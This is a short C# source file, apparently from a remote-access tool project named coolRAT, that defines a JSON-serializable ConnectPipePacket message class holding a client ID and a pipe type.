using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class ConnectPipePacket : Packet
    {
        public Guid ClientId;
        public PipeType PipeType;
        public ConnectPipePacket(Guid clientId, PipeType pipeType)
        {
            ClientId = clientId;
            PipeType = pipeType;
            Type = "ConnectPipePacket";
        }

        public new static ConnectPipePacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<ConnectPipePacket>(packet_string);
        }
    }
}
